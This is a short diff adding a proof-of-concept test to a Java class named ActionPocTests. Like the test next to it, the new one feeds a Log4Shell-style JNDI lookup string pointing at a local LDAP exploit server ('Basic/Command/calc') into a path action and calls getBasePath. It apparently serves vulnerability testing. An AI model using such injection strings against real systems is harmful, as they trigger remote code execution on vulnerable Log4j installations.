@@ -22,6 +22,15 @@ public class ActionPocTests {
     }
 
     @Test
+    public void getBasePathAbstractPathActionTestB() {
+        AbstractPathAction action = new CustomPathAction("$${${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
+        try {
+            action.getBasePath();
+        } catch (Exception e) {
+        }
+    }
+
+    @Test
     public void toStringAbstractPathActionTest() {
         AbstractPathAction action = new CustomPathAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
         try {
